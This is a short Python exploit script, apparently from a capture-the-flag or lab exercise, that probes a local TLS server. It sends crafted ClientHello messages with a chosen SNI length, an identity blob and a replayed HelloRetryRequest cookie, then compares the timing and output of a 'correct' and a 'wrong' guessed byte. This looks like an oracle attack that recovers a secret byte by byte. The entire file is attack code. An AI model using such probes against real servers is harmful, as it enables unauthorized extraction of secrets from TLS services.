import socket, time, pwn

def probe(sni_len, blob, label):
    s = socket.create_connection(('127.0.0.1',1443), timeout=5)
    t0=time.time()
    pwn.send_hs(s, pwn.build_ch(pwn.make_sni(sni_len), identity=None, key_share=None))
    r1 = pwn.read_all(s, 0.8)
    ck = pwn.hrr_cookie(r1)
    pwn.send_hs(s, pwn.build_ch(pwn.make_sni(sni_len), identity=blob, cookie=ck))
    r2 = pwn.read_all(s, 0.6)
    try:
        s.sendall(bytes([0x15,3,3,0,2,1,0]))
    except Exception as e:
        pass
    s.settimeout(2.0)
    out=b""; err=None
    try:
        while True:
            b=s.recv(4096)
            if not b:
                break
            out+=b
    except Exception as e:
        err=type(e).__name__
    print(f"{label}: bytes={out[:40]!r} err={err} t={time.time()-t0:.3f}")
    s.close()

c=bytearray(8); c[1]=0x2c
probe(0x5a, pwn.make_blob(bytes(c)), "k2 correct")
c[1]=0x2d
probe(0x5a, pwn.make_blob(bytes(c)), "k2 wrong")
